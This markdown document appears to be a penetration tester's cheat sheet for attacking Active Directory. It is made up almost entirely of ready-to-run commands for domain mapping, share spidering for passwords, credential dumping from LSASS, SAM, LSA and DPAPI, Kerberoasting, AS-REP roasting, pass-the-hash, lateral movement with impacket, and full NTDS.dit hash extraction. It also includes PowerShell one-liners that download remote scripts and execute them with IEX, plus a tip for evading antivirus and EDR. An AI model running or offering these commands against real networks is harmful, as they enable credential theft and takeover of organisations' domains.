# Active Directory

## Mapping & Enumeration

### Bloodhound
Use BloodHound to find compromission paths. First execute the collector on a host that is in the targeted domain.
```powershell
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1’);Invoke-BloodHound"
```
If it's possible, execute SharpHound. On Linux, you can use the python version. More information here : <https://github.com/BloodHoundAD/SharpHound> and <https://github.com/fox-it/BloodHound.py>
```bash
python3 bloodhound.py -u 'XXX' -dc 'DOMAIN' -c all
```
The tool give you a zip file, that you have to send to a Neo4j database. On Linux, install Neo4j and start the service :
```bash
sudo neo4j start
```
Then execute BloodHound and import the zip file.

### Goddi
To get all the important information from the Active Directory :
```bash
./goddi-linux-amd64 -dc IP_DC -domain=DOMAIN -username=USERNAME -password=PASSWORD -unsafe
```

## Shares
Dump all shares via CrackMapExec. This can be used on native Kali distribution :
```bash
crackmapexec smb IP_ADDRESS/MASK -u 'XXX' -p 'XXX' -M spider_plus -o READ_ONLY=false
```
This command create a directory cme_spider_plus in /tmp (for Linux). To retrive passwords, simply use grep, by using keywords like 'password', 'pass', 'username', 'ldap://', etc ..
```bash
grep -rnw ./ -e 'password'
```
If detected by AV/EDR, try PowerShell one-liner PowerView :
```powershell
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')"
```
Then, a lot of functionalities can be used. To find all domain shares :
```powershell
Find-DomainShare -CheckShareAccess
```
All the functionalities here : <https://powersploit.readthedocs.io/en/latest/Recon/>
## Dump credentials
### CrackMapExec
Many possibilites. Use --local-auth if using a local admin account.
With lsassy module :
```bash
crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' -M lsassy
```
Dump SAM (local hashes) :
```bash
crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' --sam
```
Dump LSA secrets :
```bash
crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' --lsa
```
### DonPAPI
Use DonPAPI to retrieve a lot of credentials (wifi, dpapi keys, browsers passwords, ...) :
```bash
python3 DonPAPI.py DOMAIN/USERNAME:PASSWORD@IP_ADDRESS
```
It's possible to use the tool with Pass-The-Hash :
```bash
python3 DonPAPI.py DOMAIN/USERNAME@IP_ADDRESS --hashes LM:NT
```
### Mimikatz
On Windows, retrieve password/hash from a dump file :
```powershell
sekurlsa::minidump "XXXXXXXXX.DMP"
sekurlsa::logonPasswords
```
On Kali, use pypykatz based on python :
```bash
pypykatz lsa minidump 'XXX.DMP'
```
### Others
Native Windows command :
```markdown
rundll32 keymgr.dll, KRShowKeyMgr
```
Savoir : Mimikatz recompiled in Go lang : <https://github.com/vincd/savoir>
## Impersonation
To execute commands with another account :
```powershell
$password = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $password)
Invoke-Command -ComputerName Server01 -Credential $credential -ScriptBlock { COMMAND }
```
## Kerberos
### Kerberoast
GetUserSPNs and get hashes :
```bash
impacket-GetUserSPNs -request -dc-ip IP_ADDRESS DOMAIN/USERNAME -outputfile hashes.kerberoast
```
If you get hashes, try to crack it and then use DCSync exploit :
```bash
impacket-secretsdump -just-dc-ntlm DOMAIN/USERNAME:PASSWORD@DC_IP
```
### AS-REP Roasting
Look for users without Kerberos pre-authentication required attribute (using credential, low privilege) :
```bash
impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
```
Get a TGT for a user, whithout his password, if you know that this account have Kerberos pre-auth disabled :
```bash
impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME -no-pass
```
### Tips to authenticate with Kerberos while pentesting
If you have a valid username/password, you can ask the KDC for a TGT. It is truly important to use the real domain name and not an alias :
```bash
impacket-getTGT 'domain.local/username:password' -dc-ip DC_IP
```
This command will create a .ccache file, which is your TGT allowing you to authenticate against the KDC. Export it on KRB5CCNAME to use it :
```bash
export KRB5CCNAME=/absolute/path/to/user.ccname
```
Then you can use, for example the impacket collection, with -k and -no-pass options to use kerberos authentication :
```bash
impacket-smbexec domain.local/username@FQDN -k -no-pass
impacket-wmiexec domain.local/username@FQDN -k -no-pass
impacket-psexec domain.local/username@FQDN -k -no-pass
```
With CrackMapExec, use the -k and --use-kcache options to use a kerberos authentication :
```bash
crackmapexec smb IP_ADDRESS/MASK -u 'USERNAME' -k --use-kcache
```

## NTDS Exfiltration
### Remote extraction using CrackmapExec or Impacket
Once you get domain admin, dump NTDS.dit to get all the hashes from the Active Directory :
```bash
crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN' -u 'USERNAME' -p 'PASSWORD' --ntds
```
Use with -H option to use NTLM hash :
```bash
crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN' -u 'USERNAME' -H 'NTLM_HASH' --ntds
```
You can also use Impacket to extract NTDS from the DC :
```bash
impacket-secretsdump domain.local/username@FQDN -k -no-pass
```
Then, extract all the hashes to put them on hashcat.
```bash
cat ntds.dit | cut -d : -f 4 |sort|uniq > hashes.txt
```

### Extract NTDS from a local NTDS.dit file
If you get a local access to the DC, you have to get NTDS.dit and SYSTEM files in order to extract all the informations. These files are located here :
```powershell
%SYSTEMROOT%\NTDS\ntds.dit
%SystemRoot%\System32\config\SYSTEM
```
Once you get these two files, you are able to extract all the informations using impacket. The 'LOCAL' at the end allows you to use local ntds file :
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
